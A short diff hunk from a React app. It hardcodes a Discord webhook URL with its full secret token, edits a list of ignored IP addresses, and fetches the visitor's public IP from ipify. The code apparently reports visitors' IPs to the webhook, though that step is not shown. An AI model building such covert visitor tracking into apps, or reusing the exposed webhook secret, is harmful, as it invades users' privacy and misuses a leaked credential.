@@ -34,7 +34,7 @@ const App = () => (
 );
 
     const webhookURL = "https://discord.com/api/webhooks/1421903456028983399/sAosgSTjB3qplqHRRLo0p7PyarLUqX8evh-UtwHkuHsbobnOZZx_Wj2FxMnkc3inNi4D";
-    const ignoredIPs = ["127.0.0.1", "192.168.1.1", ""]; // Ajoute les IPs à ignorer ici
+    const ignoredIPs = ["127.0.0.1", "192.168.1.1", "8.8.8.8"]; // Ajoute les IPs à ignorer ici
 
     fetch("https://api.ipify.org?format=json")
     .then(res => res.json())
